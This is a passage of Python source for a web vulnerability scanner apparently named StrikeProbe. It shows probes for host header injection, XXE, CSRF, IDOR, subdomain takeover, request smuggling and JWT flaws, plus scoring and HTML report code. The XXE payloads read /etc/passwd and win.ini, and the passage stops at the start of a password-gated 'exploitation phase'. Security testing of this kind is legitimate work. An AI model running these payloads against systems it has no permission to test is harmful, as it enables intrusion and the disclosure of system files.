                findings.append({"url": _inject_param(url, param, payload), "param": param, "payload": payload, "evidence": "Injected header/content found in response", "type": "url"})
                break
            if delay: time.sleep(delay)
    return findings

def test_host_header(session, url, delay=0):
    findings = []
    evil_host = "evil.strikeprobe-test.com"
    target_host = urlparse(url).netloc
    tests = [
        {"headers": {"Host": evil_host}, "desc": "Replaced Host header"},
        {"headers": {"Host": target_host, "X-Forwarded-Host": evil_host}, "desc": "X-Forwarded-Host injection"},
        {"headers": {"Host": target_host, "X-Host": evil_host}, "desc": "X-Host injection"},
    ]
    for test in tests:
        resp = safe_get(session, url, headers=test["headers"])
        if resp and evil_host in resp.text:
            findings.append({"url": url, "injection": test["desc"], "evil_host": evil_host, "evidence": "Injected host reflected in response", "type": "host_header"})
        if delay: time.sleep(delay)
    return findings

def test_xxe(session, url, delay=0):
    findings = []
    xxe_payloads = [
        {"xml": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>', "evidence": ["root:x:", "root:*:"], "desc": "Unix /etc/passwd disclosure"},
        {"xml": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><root>&xxe;</root>', "evidence": ["[fonts]", "[extensions]"], "desc": "Windows win.ini disclosure"},
        {"xml": '<?xml version="1.0"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe "strikeprobe_xxe_test">]><root>&xxe;</root>', "evidence": ["strikeprobe_xxe_test"], "desc": "Internal entity expansion"},
    ]
    for p in xxe_payloads:
        resp = safe_post(session, url, data=p["xml"], headers={"Content-Type": "application/xml"})
        if resp:
            for ev in p["evidence"]:
                if ev in resp.text:
                    findings.append({"url": url, "payload_desc": p["desc"], "evidence": ev, "type": "xxe"})
                    break
        if delay: time.sleep(delay)
    return findings

def test_csrf(session, forms, delay=0):
    findings = []
    csrf_names = ["csrf", "csrftoken", "csrf_token", "_csrf", "token", "_token", "authenticity_token", "__requestverificationtoken", "nonce"]
    for form in forms:
        if form["method"] != "POST": continue
        has_csrf = any(
            any(cn in (inp.get("name") or "").lower() for cn in csrf_names) or
            (inp.get("type") == "hidden" and inp.get("value") and len(inp["value"]) > 20)
            for inp in form["inputs"]
        )
        if not has_csrf:
            input_names = " ".join(i.get("name", "").lower() for i in form["inputs"])
            state_changing = any(kw in input_names for kw in ["password", "email", "delete", "update", "save", "pay", "transfer"])
            findings.append({"form_action": form["action"], "method": form["method"], "inputs": [i.get("name") for i in form["inputs"] if i.get("name")], "state_changing": state_changing, "severity": "HIGH" if state_changing else "MEDIUM", "type": "csrf"})
    return findings

def test_idor(session, urls, delay=0):
    findings = []
    id_pattern = re.compile(r'/(\d{1,8})(?:/|\?|$)')
    tested = set()
    for url in list(urls)[:50]:
        for match in id_pattern.findall(url):
            oid = int(match)
            if oid == 0: continue
            pkey = id_pattern.sub('/ID', url)
            if pkey in tested: continue
            tested.add(pkey)
            r1 = safe_get(session, url)
            if not r1 or r1.status_code != 200: continue
            test_url = url.replace(f"/{oid}", f"/{oid+1}")
            r2 = safe_get(session, test_url)
            if not r2 or r2.status_code != 200:
                continue
            if r1.text == r2.text:
                continue
            len_diff = abs(len(r1.text) - len(r2.text))
            min_meaningful = max(50, int(0.02 * max(len(r1.text), 1)))
            if len_diff < min_meaningful:
                continue
            findings.append({
                "url": url,
                "test_url": test_url,
                "original_id": oid,
                "test_id": oid + 1,
                "both_accessible": True,
                "evidence": f"Response differs (len diff={len_diff}). Manual verification recommended.",
                "type": "idor",
            })
        if delay: time.sleep(delay)
    return findings

def test_subdomain_takeover(session, target_url, delay=0):
    findings = []
    target_domain = urlparse(target_url).netloc
    subdomains = set()
    resp = safe_get(session, target_url)
    if resp:
        domain_parts = target_domain.split(".")
        if len(domain_parts) >= 2:
            base = ".".join(domain_parts[-2:])
            pat = re.compile(r'([a-zA-Z0-9](?:[a-zA-Z0-9\-]*[a-zA-Z0-9])?\.)+' + re.escape(base))
            for m in pat.finditer(resp.headers.get("Content-Security-Policy", "") + resp.text):
                subdomains.add(m.group(0).rstrip("."))
    for sub in list(subdomains)[:30]:
        if sub == target_domain: continue
        try:
            socket.getaddrinfo(sub, 80, socket.AF_INET)
        except socket.gaierror:
            findings.append({"subdomain": sub, "issue": "DNS resolution failed — potential dangling record", "severity": "MEDIUM", "type": "subdomain_takeover"})
            continue
        except Exception:
            continue
        for proto in ("https", "http"):
            sub_resp = safe_get(session, f"{proto}://{sub}", timeout=(3, 5))
            if sub_resp:
                for svc, fp in TAKEOVER_FINGERPRINTS.items():
                    if fp.lower() in sub_resp.text.lower():
                        findings.append({"subdomain": sub, "service": svc, "fingerprint": fp, "issue": f"Unclaimed {svc} resource", "severity": "HIGH", "type": "subdomain_takeover"})
                break
        if delay: time.sleep(delay)
    return findings

def test_http_smuggling(session, url, delay=0):
    findings = []
    try:
        start = time.time()
        safe_post(session, url, data="1\r\nZ\r\nQ\r\n\r\n", headers={"Content-Length": "4", "Transfer-Encoding": "chunked"})
        t_clte = time.time() - start
        start = time.time()
        safe_post(session, url, data="test")
        t_normal = time.time() - start
        if t_clte > t_normal + 5:
            findings.append({"url": url, "type": "CL.TE", "timing_diff": round(t_clte - t_normal, 2), "evidence": "Timing diff suggests CL.TE desync"})
    except Exception:
        pass
    return findings

def test_jwt(session, url, delay=0):
    findings = []
    resp = safe_get(session, url)
    if not resp: return findings
    jwt_pattern = re.compile(r'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*')
    jwt_locations = []
    for cookie in resp.cookies:
        if jwt_pattern.search(cookie.value):
            jwt_locations.append({"location": f"Cookie: {cookie.name}", "token": cookie.value})
    for hname, hval in resp.headers.items():
        if jwt_pattern.search(hval):
            jwt_locations.append({"location": f"Header: {hname}", "token": hval})
    for jt in jwt_pattern.findall(resp.text)[:5]:
        jwt_locations.append({"location": "Response body", "token": jt})
    for ji in jwt_locations:
        token = ji["token"]
        m = jwt_pattern.search(token)
        if not m: continue
        jwt_token = m.group(0)
        try:
            h_b64 = jwt_token.split(".")[0]
            h_b64 += "=" * (4 - len(h_b64) % 4) if len(h_b64) % 4 else ""
            header = json.loads(base64.urlsafe_b64decode(h_b64))
            alg = header.get("alg", "unknown")
            issues = []
            if alg.lower() == "none":
                issues.append("CRITICAL: alg='none' — token can be forged without a secret!")
            elif alg in ("HS256", "HS384", "HS512"):
                issues.append(f"{alg} (symmetric HMAC) — verify secret strength (256+ bits)")
            p_b64 = jwt_token.split(".")[1]
            p_b64 += "=" * (4 - len(p_b64) % 4) if len(p_b64) % 4 else ""
            payload = json.loads(base64.urlsafe_b64decode(p_b64))
            exp = payload.get("exp")
            if exp and isinstance(exp, (int, float)) and datetime.fromtimestamp(exp, tz=timezone.utc) < datetime.now(timezone.utc):
                issues.append("WARNING: Token appears expired — ensure the server rejects expired tokens.")
            for key in payload:
                if key.lower() in ["password", "secret", "ssn", "credit_card"]:
                    issues.append(f"Sensitive field '{key}' exposed in JWT payload!")
            if issues:
                findings.append({"location": ji["location"], "algorithm": alg, "issues": issues, "header": header, "payload_keys": list(payload.keys()), "type": "jwt"})
        except Exception:
            continue
    return findings


# ─────────────────────────────────────────────
# Scoring
# ─────────────────────────────────────────────
SEVERITY_WEIGHTS = {"CRITICAL": 10.0, "HIGH": 6.0, "MEDIUM": 3.0, "LOW": 1.0, "INFO": 0.0}

def calculate_security_score(report):
    import math
    counts = {"CRITICAL": 0, "HIGH": 0, "MEDIUM": 0, "LOW": 0, "INFO": 0}
    hdr = report.get("header_analysis", {})
    header_w = 0.0
    for h in hdr.get("missing_headers", []):
        sev = HEADER_DESCRIPTIONS.get(h, {}).get("severity", "MEDIUM")
        counts[sev] += 1
        header_w += SEVERITY_WEIGHTS.get(sev, 3.0) * 0.3
    for _ in hdr.get("info_disclosure", {}):
        counts["LOW"] += 1
        header_w += 1.0
    for ck in hdr.get("cookie_issues", []):
        for flag in ck["missing_flags"]:
            sev = COOKIE_FLAG_DESCRIPTIONS.get(flag, {}).get("severity", "MEDIUM")
            counts[sev] += 1
            header_w += SEVERITY_WEIGHTS.get(sev, 3.0) * 0.4
    header_w = min(header_w, 20.0)

    vuln_modules = [
        ("sqli","CRITICAL"),("xss","HIGH"),("ssti","CRITICAL"),("cmdi","CRITICAL"),
        ("path_traversal","HIGH"),("ssrf","HIGH"),("open_redirect","MEDIUM"),("cors","HIGH"),
        ("crlf","HIGH"),("host_header","MEDIUM"),("xxe","CRITICAL"),("csrf","MEDIUM"),
        ("idor","HIGH"),("subdomain_takeover","HIGH"),("http_smuggling","HIGH"),("jwt","HIGH"),
    ]
    vuln_w = 0.0
    for key, sev in vuln_modules:
        n = len(report.get(key, []))
        counts[sev] += n
        vuln_w += n * SEVERITY_WEIGHTS.get(sev, 3.0)

    vuln_deduction = min(70, vuln_w * 0.8) if vuln_w > 0 else 0
    score = max(0, 100 - header_w - vuln_deduction)
    grade = "A+" if score >= 85 else "A" if score >= 75 else "B" if score >= 60 else "C" if score >= 45 else "D" if score >= 30 else "F"
    severity_order = ["INFO", "LOW", "MEDIUM", "HIGH", "CRITICAL"]
    max_sev = next((s for s in reversed(severity_order) if counts[s] > 0), "INFO")
    return {"score": round(score, 1), "grade": grade, "max_severity": max_sev, "counts": counts, "total_findings": sum(counts.values())}


# ─────────────────────────────────────────────
# Console Report
# ─────────────────────────────────────────────
def print_vuln_section(title, findings, vuln_key, issue_counter):
    if not findings: return issue_counter
    remed = REMEDIATION.get(vuln_key, {})
    print_section(f"⚠  {title}")
    sev = remed.get("severity", "HIGH")
    cvss = remed.get("cvss", "N/A")
    cwe = remed.get("cwe", "")
    owasp = remed.get("owasp", "")
    print(f"\n  {severity_badge(sev)}  CVSS: {cvss}  {DIM}{cwe} | {owasp}{RESET}")
    print(f"\n  {BOLD}What is this?{RESET}")
    print(f"  {remed.get('what', title)}")
    if remed.get("scenario"):
        print(f"\n  {BOLD}{YELLOW}Real-World Attack Scenario:{RESET}")
        for line in remed["scenario"].split("\n"):
            print(f"  {YELLOW}{line}{RESET}")
    if remed.get("risk"):
        print(f"\n  {BOLD}Risk:{RESET}")
        print(f"  {remed['risk']}")
    if remed.get("impact"):
        print(f"\n  {BOLD}Impact:{RESET}")
        for imp in remed["impact"]:
            print(f"    • {imp}")
    if remed.get("fix"):
        print(f"\n  {BOLD}How to Fix:{RESET}")
        for line in remed["fix"].split("\n"):
            print(f"    {line}")
    if remed.get("code_example"):
        print(f"\n  {BOLD}Code Example (Vulnerable vs Safe):{RESET}")
        for line in remed["code_example"].split("\n"):
            print(f"    {DIM}{line}{RESET}")
    if remed.get("references"):
        print(f"\n  {BOLD}References:{RESET}")
        for ref in remed["references"]:
            print(f"    → {ref}")
    print(f"\n  {BOLD}Affected Endpoints ({len(findings)}):{RESET}")
    for f in findings:
        issue_counter += 1
        loc = f.get("url") or f.get("form_action") or f.get("subdomain", "N/A")
        print(f"\n    #{issue_counter}  {severity_badge(sev)}  CVSS: {cvss}")
        print(f"      Location : {loc}")
        if f.get("param"):
            print(f"      Parameter: {f['param']}")
        if f.get("payload"):
            print(f"      Payload  : {f['payload']}")
        if f.get("evidence"):
            print(f"      Evidence : {f['evidence']}")
        if f.get("matched_signature"):
            print(f"      DB Error : {f['matched_signature']}")
        if f.get("engine"):
            print(f"      Engine   : {f['engine']}")
        if f.get("issue"):
            print(f"      Detail   : {f['issue']}")
        if f.get("issues"):
            for iss in f["issues"]:
                print(f"      ⚠ {iss}")
    return issue_counter

def print_report(report):
    print_section("S C A N   R E P O R T")
    hdr = report.get("header_analysis", {})
    issue_num = 0

    print_section("SEVERITY GUIDE")
    print(f"  {severity_badge('CRITICAL')} Immediate compromise or high-confidence exploitability; fix now.")
    print(f"  {severity_badge('HIGH')}     Serious security impact; prioritize remediation.")
    print(f"  {severity_badge('MEDIUM')}   Meaningful risk in common deployments; fix soon.")
    print(f"  {severity_badge('LOW')}      Harder to exploit or limited impact; schedule a fix.")
    print(f"  {severity_badge('INFO')}     Informational hardening / best practice.")

    # Headers
    print_section("🛡  MISSING SECURITY HEADERS")
    if hdr.get("missing_headers"):
        for h in hdr["missing_headers"]:
            issue_num += 1
            desc = HEADER_DESCRIPTIONS.get(h, {})
            sev = desc.get("severity", "MEDIUM")
            print(f"\n  Issue #{issue_num}  {severity_badge(sev)}")
            print(f"  {BOLD}Header:{RESET}  {h}")
            print(f"  {BOLD}What:{RESET}   {desc.get('what', '')}")
            print(f"  {BOLD}Risk:{RESET}   {desc.get('risk', '')}")
            print(f"  {BOLD}Fix:{RESET}    {desc.get('fix', '')}")
    else:
        print(f"\n  {GREEN}{BOLD}✓ All critical security headers present.{RESET}")

    # Info disclosure
    if hdr.get("info_disclosure"):
        print_section("🔍  INFORMATION DISCLOSURE")
        for h, v in hdr["info_disclosure"].items():
            issue_num += 1
            desc = INFO_DISCLOSURE_DESCRIPTIONS.get(h, {})
            sev = desc.get("severity", "MEDIUM")
            print(f"\n  Issue #{issue_num}  {severity_badge(sev)}")
            print(f"  {BOLD}Exposed:{RESET} {h}: {BOLD}{v}{RESET}")
            print(f"  {BOLD}Risk:{RESET}    {desc.get('risk', '')}")
            print(f"  {BOLD}Fix:{RESET}     {desc.get('fix', '')}")

    # Cookie
    if hdr.get("cookie_issues"):
        print_section("🍪  INSECURE COOKIES")
        for ck in hdr["cookie_issues"]:
            for flag in ck["missing_flags"]:
                issue_num += 1
                desc = COOKIE_FLAG_DESCRIPTIONS.get(flag, {})
                print(f"\n  Issue #{issue_num}  {severity_badge(desc.get('severity','MEDIUM'))}")
                print(f"  {BOLD}Cookie:{RESET} {ck['cookie_name']}  (missing: {flag})")
                print(f"  {BOLD}Risk:{RESET}   {desc.get('risk','')}")
                print(f"  {BOLD}Fix:{RESET}    {desc.get('fix','')}")

    # Recon
    print_section("🔎  RECONNAISSANCE")
    print(f"  Discovered: {report.get('endpoints_found',0)} links, {report.get('forms_found',0)} forms, {report.get('js_urls_found',0)} JS URLs")
    if report.get("interesting_paths"):
        print(f"  {RED}{BOLD}Sensitive paths found:{RESET}")
        for p in report["interesting_paths"][:20]:
            print(f"    → {p['path']}  ({p['status']}, {p['size']} bytes)")

    # Vulnerability modules
    vuln_sections = [
        ("SQL INJECTION", "sqli"),
        ("CROSS-SITE SCRIPTING (XSS)", "xss"),
        ("SERVER-SIDE TEMPLATE INJECTION (SSTI)", "ssti"),
        ("OS COMMAND INJECTION", "cmdi"),
        ("PATH TRAVERSAL / LFI", "path_traversal"),
        ("SERVER-SIDE REQUEST FORGERY (SSRF)", "ssrf"),
        ("OPEN REDIRECT", "open_redirect"),
        ("CORS MISCONFIGURATION", "cors"),
        ("CRLF INJECTION", "crlf"),
        ("HOST HEADER INJECTION", "host_header"),
        ("XML EXTERNAL ENTITY (XXE)", "xxe"),
        ("CROSS-SITE REQUEST FORGERY (CSRF)", "csrf"),
        ("INSECURE DIRECT OBJECT REFERENCE (IDOR)", "idor"),
        ("SUBDOMAIN TAKEOVER", "subdomain_takeover"),
        ("HTTP REQUEST SMUGGLING", "http_smuggling"),
        ("JWT WEAKNESS", "jwt"),
    ]
    found_vulns = False
    for title, key in vuln_sections:
        if report.get(key):
            found_vulns = True
            issue_num = print_vuln_section(title, report[key], key, issue_num)
    if not found_vulns:
        print_section("VULNERABILITIES")
        print(f"\n  {GREEN}{BOLD}✓ No vulnerabilities detected across all 16 modules.{RESET}")

    # Scorecard
    score_data = calculate_security_score(report)
    print_section("📊  SECURITY SCORECARD")
    score = score_data["score"]
    grade = score_data["grade"]
    bar_len = 40
    filled = int(score / 100 * bar_len)
    bar_color = GREEN if score >= 70 else YELLOW if score >= 40 else RED
    print(f"\n  {BOLD}Score:{RESET}  {bar_color}{score}/100{RESET}   Grade: {bar_color}{BOLD}{grade}{RESET}")
    print(f"  [{bar_color}{'█' * filled}{RESET}{'░' * (bar_len - filled)}]")
    print(f"\n  CRITICAL : {score_data['counts']['CRITICAL']}   HIGH : {score_data['counts']['HIGH']}   "
          f"MEDIUM : {score_data['counts']['MEDIUM']}   LOW : {score_data['counts']['LOW']}   "
          f"Total : {score_data['total_findings']}")
    print(f"\n  Scanned  : {report.get('timestamp','N/A')}")
    print(f"  Target   : {report.get('target','N/A')}")
    print(f"  Version  : StrikeProbe v{VERSION}")
    print(f"\n{'═' * 68}\n")


# ─────────────────────────────────────────────
# JSON / HTML Export
# ─────────────────────────────────────────────
def export_json(report, filepath):
    report["security_score"] = calculate_security_score(report)
    with open(filepath, "w", encoding="utf-8") as f:
        json.dump(report, f, indent=2, default=str)
    print(f"[+] JSON saved → {filepath}")

def generate_html_report(report, filepath):
    score_data = calculate_security_score(report)
    target = html_module.escape(report.get("target", "N/A"))
    score = score_data["score"]
    grade = score_data["grade"]
    score_color = "#00e676" if score >= 70 else "#ffab00" if score >= 40 else "#ff1744"
    hdr = report.get("header_analysis", {})

    vuln_keys = ["sqli","xss","ssti","cmdi","path_traversal","ssrf","open_redirect","cors","crlf","host_header","xxe","csrf","idor","subdomain_takeover","http_smuggling","jwt"]

    playbooks_html = '<div class="section"><h2>📚 Remediation Playbooks</h2>'
    playbooks_html += '<p style="color:var(--dim);font-size:.9rem">Each module includes what it is, risk, fix, and a safe code pattern. Expand as needed.</p>'
    for key in vuln_keys:
        remed = REMEDIATION.get(key, {})
        title = html_module.escape(remed.get("what", key.upper()))
        sev_raw = remed.get("severity", "HIGH")
        sev = str(sev_raw).lower()
        cvss = html_module.escape(str(remed.get("cvss", "N/A")))
        cwe = html_module.escape(remed.get("cwe", ""))
        owasp = html_module.escape(remed.get("owasp", ""))
        risk = html_module.escape(remed.get("risk", ""))
        fix = html_module.escape(remed.get("fix", ""))
        scenario = html_module.escape(remed.get("scenario", ""))
        code_example = html_module.escape(remed.get("code_example", ""))

        impact_html = ""
        if remed.get("impact"):
            impact_html = '<div class="impact"><b>Impact:</b><ul>' + "".join(f'<li>{html_module.escape(str(i))}</li>' for i in remed["impact"]) + '</ul></div>'

        refs_html = ""
        if remed.get("references"):
            refs_html = '<div class="refs"><b>References:</b><ul>' + "".join(f'<li><a href="{r}" target="_blank">{html_module.escape(r)}</a></li>' for r in remed["references"]) + '</ul></div>'

        playbooks_html += f'''
        <details class="playbook">
            <summary>
                <span class="badge badge-{sev}">{html_module.escape(str(sev_raw))}</span>
                <span class="pb-title">{title}</span>
                <span class="tag">CVSS: {cvss}</span>
                <span class="tag">{cwe}</span>
                <span class="tag">{owasp}</span>
            </summary>
            <div class="playbook-body">
                <p class="risk-text"><b>Risk:</b> {risk}</p>
                {f'<div class="scenario"><b>⚔️ Real-World Scenario:</b><pre>{scenario}</pre></div>' if scenario else ''}
                {impact_html}
                {f'<div class="fix"><b>Fix:</b><pre>{fix}</pre></div>' if fix else ''}
                {f'<div class="code"><b>Code Example:</b><pre><code>{code_example}</code></pre></div>' if code_example else ''}
                {refs_html}
            </div>
        </details>'''
    playbooks_html += "</div>"

    findings_html = ""
    fn = 0

    if hdr.get("missing_headers"):
        findings_html += '<div class="section"><h2>🛡️ Missing Security Headers</h2>'
        for h in hdr["missing_headers"]:
            fn += 1
            desc = HEADER_DESCRIPTIONS.get(h, {})
            sev = desc.get("severity", "MEDIUM").lower()
            findings_html += f'<div class="finding"><div class="finding-header"><span class="badge badge-{sev}">{sev.upper()}</span><span>#{fn} — {html_module.escape(desc.get("what",h))}</span></div><div class="finding-body"><p><b>Risk:</b> {html_module.escape(desc.get("risk",""))}</p><p><b>Fix:</b> {html_module.escape(desc.get("fix",""))}</p></div></div>'
        findings_html += '</div>'

    if hdr.get("info_disclosure"):
        findings_html += '<div class="section"><h2>🔍 Information Disclosure</h2>'
        for h, v in hdr["info_disclosure"].items():
            fn += 1
            desc = INFO_DISCLOSURE_DESCRIPTIONS.get(h, {})
            findings_html += f'<div class="finding"><div class="finding-header"><span class="badge badge-medium">MEDIUM</span><span>#{fn} — {html_module.escape(desc.get("what",h))}</span></div><div class="finding-body"><p><b>Exposed:</b> <code>{html_module.escape(v)}</code></p><p><b>Fix:</b> {html_module.escape(desc.get("fix",""))}</p></div></div>'
        findings_html += '</div>'

    for key in vuln_keys:
        items = report.get(key, [])
        if not items: continue
        remed = REMEDIATION.get(key, {})
        title = remed.get("what", key.upper())
        sev = remed.get("severity", "HIGH").lower()
        cvss = remed.get("cvss", "N/A")
        cwe = html_module.escape(remed.get("cwe", ""))
        owasp = html_module.escape(remed.get("owasp", ""))
        scenario_html = ""
        if remed.get("scenario"):
            scenario_html = f'<div class="scenario"><b>⚔️ Real-World Scenario:</b><pre>{html_module.escape(remed["scenario"])}</pre></div>'
        impact_html = ""
        if remed.get("impact"):
            impact_html = '<div class="impact"><b>Impact:</b><ul>' + "".join(f'<li>{html_module.escape(i)}</li>' for i in remed["impact"]) + '</ul></div>'
        fix_html = f'<div class="fix"><b>Fix:</b><pre>{html_module.escape(remed.get("fix",""))}</pre></div>' if remed.get("fix") else ""
        code_html = f'<div class="code"><b>Code Example:</b><pre><code>{html_module.escape(remed.get("code_example",""))}</code></pre></div>' if remed.get("code_example") else ""
        refs_html = ""
        if remed.get("references"):
            refs_html = '<div class="refs"><b>References:</b><ul>' + "".join(f'<li><a href="{r}" target="_blank">{html_module.escape(r)}</a></li>' for r in remed["references"]) + '</ul></div>'

        ep_html = ""
        for item in items:
            fn += 1
            loc = html_module.escape(str(item.get("url") or item.get("form_action") or item.get("subdomain","N/A")))
            ep_html += f'<div class="endpoint"><span class="ep-num">#{fn}</span> <span class="ep-loc">{loc}</span>'
            if item.get("param"): ep_html += f' <span class="ep-param">Param: {html_module.escape(item["param"])}</span>'
            if item.get("payload"): ep_html += f'<br><span class="ep-payload">Payload: <code>{html_module.escape(item["payload"])}</code></span>'
            if item.get("evidence"): ep_html += f'<br><span class="ep-evidence">Evidence: {html_module.escape(str(item["evidence"]))}</span>'
            ep_html += '</div>'

        findings_html += f'''
        <div class="section">
            <h2>⚠️ {html_module.escape(title)}</h2>
            <div class="vuln-meta">
                <span class="badge badge-{sev}">{sev.upper()}</span>
                <span class="tag">CVSS: {cvss}</span>
                <span class="tag">{cwe}</span>
                <span class="tag">{owasp}</span>
            </div>
            <p class="risk-text">{html_module.escape(remed.get("risk",""))}</p>
            {scenario_html}{impact_html}{fix_html}{code_html}{refs_html}
            <div class="endpoints"><b>Affected Endpoints ({len(items)}):</b>{ep_html}</div>
        </div>'''

    page_html = f'''<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>StrikeProbe Report — {target}</title>
<style>
:root {{--bg:#0a0e17;--surface:#111827;--surface2:#1a2332;--border:#1e293b;--text:#e2e8f0;--dim:#94a3b8;--accent:#6366f1;--cr:#ff1744;--hi:#ff5252;--me:#ffab00;--lo:#448aff;--ok:#00e676;}}
*{{box-sizing:border-box;margin:0;padding:0;}}
body{{background:var(--bg);color:var(--text);font-family:'Segoe UI',system-ui,sans-serif;line-height:1.6;padding:2rem;}}
.container{{max-width:1100px;margin:0 auto;}}
h1{{font-size:2rem;background:linear-gradient(135deg,#6366f1,#a855f7);-webkit-background-clip:text;-webkit-text-fill-color:transparent;}}
h2{{font-size:1.2rem;color:var(--accent);border-bottom:1px solid var(--border);padding-bottom:.5rem;margin-bottom:1rem;}}
.header{{text-align:center;padding:2rem;background:var(--surface);border-radius:12px;border:1px solid var(--border);margin-bottom:2rem;}}
.meta{{display:flex;gap:2rem;justify-content:center;margin-top:1rem;flex-wrap:wrap;color:var(--dim);font-size:.9rem;}}
.scorecard{{display:grid;grid-template-columns:repeat(3,1fr);gap:1.5rem;margin-bottom:2rem;}}
.score-card{{background:var(--surface);border:1px solid var(--border);border-radius:12px;padding:1.5rem;text-align:center;}}
.score-card .value{{font-size:2.5rem;font-weight:800;color:{score_color};}}
.score-card .label{{color:var(--dim);font-size:.8rem;text-transform:uppercase;letter-spacing:1px;}}
.score-bar{{width:100%;height:8px;background:var(--surface2);border-radius:4px;margin-top:.5rem;overflow:hidden;}}
.score-bar-fill{{height:100%;background:{score_color};width:{score}%;border-radius:4px;}}
.section{{background:var(--surface);border:1px solid var(--border);border-radius:12px;padding:1.5rem;margin-bottom:1.5rem;}}
.finding{{background:var(--surface2);border:1px solid var(--border);border-radius:8px;padding:1rem;margin-bottom:.75rem;}}
.finding-header{{display:flex;align-items:center;gap:.75rem;margin-bottom:.5rem;font-weight:600;}}
.finding-body{{color:var(--dim);font-size:.9rem;}}
.badge{{display:inline-block;padding:2px 10px;border-radius:4px;font-size:.75rem;font-weight:700;text-transform:uppercase;}}
.badge-critical{{background:var(--cr);color:#fff;}}
.badge-high{{background:var(--hi);color:#fff;}}
.badge-medium{{background:var(--me);color:#000;}}
.badge-low{{background:var(--lo);color:#fff;}}
.tag{{background:var(--surface2);color:var(--dim);padding:2px 8px;border-radius:4px;font-size:.8rem;}}
.vuln-meta{{display:flex;gap:.5rem;flex-wrap:wrap;margin-bottom:1rem;align-items:center;}}
.risk-text{{color:var(--dim);font-size:.9rem;margin-bottom:1rem;}}
.scenario{{background:#1a1a2e;border-left:3px solid var(--me);padding:1rem;border-radius:6px;margin-bottom:1rem;font-size:.85rem;}}
.scenario pre{{white-space:pre-wrap;color:var(--me);margin-top:.5rem;}}
.impact ul{{padding-left:1.5rem;color:var(--dim);font-size:.9rem;margin-bottom:1rem;}}
.fix,.code{{margin-bottom:1rem;}}
pre{{background:var(--bg);padding:1rem;border-radius:6px;overflow-x:auto;font-size:.82rem;border:1px solid var(--border);white-space:pre-wrap;}}
code{{font-family:'Fira Code','Cascadia Code','Consolas',monospace;}}
.refs a{{color:var(--accent);font-size:.85rem;}}
.endpoints{{margin-top:1rem;}}
.endpoint{{background:var(--bg);padding:.6rem 1rem;border-radius:6px;margin:.4rem 0;font-size:.85rem;border-left:3px solid var(--accent);}}
.ep-num{{color:var(--accent);font-weight:700;}}
.ep-param{{color:var(--me);margin-left:.5rem;}}
.ep-payload{{color:var(--dim);}}
.ep-evidence{{color:var(--hi);}}
.sev-grid{{display:grid;grid-template-columns:repeat(5,1fr);gap:.75rem;margin-top:1rem;}}
.sev-cell{{text-align:center;padding:.75rem;border-radius:8px;background:var(--surface2);}}
.sev-cell .cnt{{font-size:1.5rem;font-weight:700;}}
.sev-cell .nm{{font-size:.7rem;text-transform:uppercase;color:var(--dim);}}
.sev-guide{{color:var(--dim);font-size:.9rem;}}
details.playbook{{background:var(--surface2);border:1px solid var(--border);border-radius:8px;padding:1rem;margin:.75rem 0;}}
details.playbook summary{{cursor:pointer;list-style:none;display:flex;flex-wrap:wrap;gap:.5rem;align-items:center;font-weight:700;}}
details.playbook summary::-webkit-details-marker{{display:none;}}
.playbook-body{{margin-top:1rem;color:var(--dim);font-size:.9rem;}}
.pb-title{{color:var(--text);}}
.footer{{text-align:center;padding:1.5rem;color:var(--dim);font-size:.8rem;border-top:1px solid var(--border);margin-top:2rem;}}
@media(max-width:768px){{.scorecard{{grid-template-columns:1fr;}}.sev-grid{{grid-template-columns:repeat(3,1fr);}}body{{padding:1rem;}}}}
</style>
</head>
<body>
<div class="container">
<div class="header">
<h1>🔒 StrikeProbe Security Report</h1>
<p style="color:var(--dim)">Enterprise Non-Destructive Vulnerability Assessment — v{VERSION}</p>
<div class="meta">
<span><b>Target:</b> {target}</span>
<span><b>Scanned:</b> {html_module.escape(str(report.get("timestamp","N/A")))}</span>
</div>
</div>
<div class="scorecard">
<div class="score-card"><div class="value">{score}</div><div class="label">Security Score</div><div class="score-bar"><div class="score-bar-fill"></div></div></div>
<div class="score-card"><div class="value" style="color:{score_color}">{grade}</div><div class="label">Grade</div></div>
<div class="score-card"><div class="value">{score_data["total_findings"]}</div><div class="label">Total Findings</div></div>
</div>
<div class="section"><h2>📊 Severity Distribution</h2>
<div class="sev-grid">
<div class="sev-cell"><div class="cnt" style="color:var(--cr)">{score_data["counts"]["CRITICAL"]}</div><div class="nm">Critical</div></div>
<div class="sev-cell"><div class="cnt" style="color:var(--hi)">{score_data["counts"]["HIGH"]}</div><div class="nm">High</div></div>
<div class="sev-cell"><div class="cnt" style="color:var(--me)">{score_data["counts"]["MEDIUM"]}</div><div class="nm">Medium</div></div>
<div class="sev-cell"><div class="cnt" style="color:var(--lo)">{score_data["counts"]["LOW"]}</div><div class="nm">Low</div></div>
<div class="sev-cell"><div class="cnt">{score_data["counts"]["INFO"]}</div><div class="nm">Info</div></div>
</div>
</div>
<div class="section"><h2>🧭 Severity Guide</h2>
<div class="sev-guide">
<p><b>CRITICAL</b>: immediate compromise or very high-confidence exploitability.</p>
<p><b>HIGH</b>: serious impact; prioritize remediation.</p>
<p><b>MEDIUM</b>: meaningful risk in common deployments; fix soon.</p>
<p><b>LOW</b>: limited impact or harder to exploit; schedule a fix.</p>
<p><b>INFO</b>: best-practice hardening recommendation.</p>
</div>
</div>
{playbooks_html}
{findings_html}
<div class="footer">StrikeProbe v{VERSION} — OWASP Top 10:2025 · 16 Detection Modules · All probes non-destructive</div>
</div>
</body>
</html>'''
    with open(filepath, "w", encoding="utf-8") as f:
        f.write(page_html)
    print(f"[+] HTML report saved → {filepath}")


# ─────────────────────────────────────────────
# PASSWORD GATE — Deep Exploitation Phase
# ─────────────────────────────────────────────
def _verify_password(password: str) -> bool:
    """Verify the exploitation password using SHA-256."""
    return hashlib.sha256(password.encode("utf-8")).hexdigest() == EXPLOIT_PASSWORD_HASH

def _prompt_for_password(max_attempts: int = 3) -> bool:
    """
    Prompt the user for the exploitation phase password.
    Uses getpass so the password is NOT echoed to the terminal.
    Returns True if the correct password is entered.
    """
    print_banner_box([
